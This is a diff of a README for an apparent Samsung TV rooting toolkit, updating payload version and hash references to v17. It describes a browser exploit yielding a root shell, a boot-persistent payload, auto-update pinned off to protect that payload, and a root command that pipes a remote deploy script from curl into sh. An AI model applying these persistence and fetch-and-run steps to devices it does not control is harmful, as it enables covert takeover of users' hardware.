@@ -35,7 +35,7 @@ channel on TCP 31337 (line protocol, replies end with `__END__`).
 
 | | |
 |---|---|
-| Payload | v16, 24,064 B, md5 `ef8721881df2903f36371aaa482eed9f` (`server/payload.dll`, source `payload/`; host-independent) |
+| Payload | v17, 23,552 B, md5 `36d7c09f0f733cf5099b2fa591aebe5e` (`server/payload.dll`, source `payload/`; host-independent) |
 | Boot-to-root | ~40 s typical; v16 cold boot rooted at 21:48:45 with `bind=192.168.178.175` (channel up at the first probe, +7 s); v14 measured 53 s from a forced reboot |
 | Root identity | `uid=0`, `CapEff=0x3fffffffff`, running under the app's own SMACK label |
 | Boot hook | a `boot_sequence` row in `/opt/dbspace/user/5001/.appsvc.db` |
@@ -70,7 +70,7 @@ flow. The sequence of changes that got here is in `CHANGELOG.md`.
 browser on the exploit page hands back a root shell on `127.0.0.1:9999`; run
 `server/recover.sh` from that shell to reinstall the payload.
 
-Payload lineage (v5 → v16, and what each version fixed) is in `CHANGELOG.md`; the label
+Payload lineage (v5 → v17, and what each version fixed) is in `CHANGELOG.md`; the label
 regression that broke boot persistence is `docs/BOOT-REGRESSION-SMACK.md`.
 
 ### Channel hardening (v14, extended in v15/v16)
@@ -109,7 +109,7 @@ may block on the network:
 ### Auto-update is pinned off
 
 The TV would happily replace the app the payload lives in. The payload therefore
-re-asserts the menu setting at every boot (v13, unchanged in v16) and logs the readback
+re-asserts the menu setting at every boot (v13, unchanged in v17) and logs the readback
 (`DSHROOT autoupdate … = Int32: 0`):
 
 ```sh
@@ -210,7 +210,7 @@ TV boot: com.samsung.tv.MultiControl-Service (dotnet-inhouse, app_onboot)
 | `tools/test_stub.py` | live-stub protocol + clamp checks (fresh page load) |
 | `tools/test_all.py` | runs every layer above; `--tv` adds the live stub |
 | `tools/tv_ws_launch.py` | Samsung remote-control WebSocket diagnostic/launcher (refused on this unit) |
-| `payload/Program.cs` | boot payload source (v16) |
+| `payload/Program.cs` | boot payload source (v17) |
 | `payload/BootPayload.csproj` | net6.0 project, assembly `MultiControlService` |
 | `root.ps1` | one-command runner (server + root + deploy + verify) |
 | `uninstall.ps1` | one-command uninstall (restore stock + verify) |
@@ -294,7 +294,7 @@ shell - that corrupts the stream and wastes the page load.
 
 `server/payload.dll` is committed **deliberately** — it is the artifact the TV
 fetches during deploy, and it is byte-identical to the build output
-`payload/out/MultiControlService.dll` (md5 `ef872188…`, v16), so the repo runs
+`payload/out/MultiControlService.dll` (md5 `36d7c09f…`, v17; reproducible — see §9), so the repo runs
 without a .NET SDK. Rebuild with `dotnet build payload/BootPayload.csproj -c
 Release`, then update the `WANT=`/`SIZE_WANT=` gate in `server/deploy.sh`.
 
@@ -337,7 +337,7 @@ python run_root.py "id" 6               # uid=0(root)
 
 # 4. deploy the boot payload
 python run_root.py "curl -s http://<HOST_IP>/deploy.sh | sh" 45
-#    expect: UID=0, SIZE=24064, MD5=ef872188..., COPY=ok, HOST_FILE=..., DEPLOY_DONE
+#    expect: UID=0, SIZE=23552, MD5=36d7c09f..., COPY=ok, HOST_FILE=..., DEPLOY_DONE
 #    (deploy.sh now exits 1 on a label/boot-row/AUL failure instead of warning)
 
 # 5. reboot the TV (exit the browser first so it does not restore the page)
@@ -356,7 +356,7 @@ gateway, deploy/uninstall control flow, source↔blob↔page consistency). Then:
 
 - [ ] `root_shell.py "id" <TV_IP>` returns `uid=0(root)`.
 - [ ] `root_shell.py "cat /proc/self/status | grep CapEff" <TV_IP>` → `0000003fffffffff`.
-- [ ] `root_shell.py "md5sum /opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll" <TV_IP>` → `ef872188…`.
+- [ ] `root_shell.py "md5sum /opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll" <TV_IP>` → `36d7c09f…`.
 - [ ] Cold boot with the browser closed → channel is back within ~60–90 s.
 - [ ] `kill -9 <app pid>` → channel back in ~12 s, still uid 0.
 - [ ] `python tools/test_all.py --tv` against a fresh page load (stub protocol
@@ -420,12 +420,12 @@ that downloads it) and reboot. Things to preserve when editing `Program.cs`:
 - Validate the cred (`SaneCred`: usage, ids, physical range) **and only write it when its uid is 5001** (`PatchCred` enforces this in v15).
 - Close `_fd` after rooting, before `RootChannel()`.
 - Keep the channel line protocol and the `__END__` terminator.
-- **A rebuild is not byte-reproducible across commits.** The SDK embeds the git
-  SHA in `AssemblyInformationalVersion` (`1.0.0+<sha>`), so the md5 changes even
-  with identical source: take `WANT=`/`SIZE_WANT=` from the new artifact and
-  deploy it. Comments do not change the IL. Pin
-  `IncludeSourceRevisionInInformationalVersion=false` in the csproj if
-  reproducible artifacts ever matter (candidate for v17).
+- **Builds are reproducible since v17.** The csproj pins
+  `IncludeSourceRevisionInInformationalVersion=false`; before that the SDK
+  embedded the git SHA in `AssemblyInformationalVersion` (`1.0.0+<sha>`), so the
+  same source built to a different md5 at every commit. Two clean builds of the
+  same source now produce the same artifact (comments never entered the IL).
+  After a real payload change, still take `WANT=`/`SIZE_WANT=` from the new build.
 
 ## 10. Recovery
 
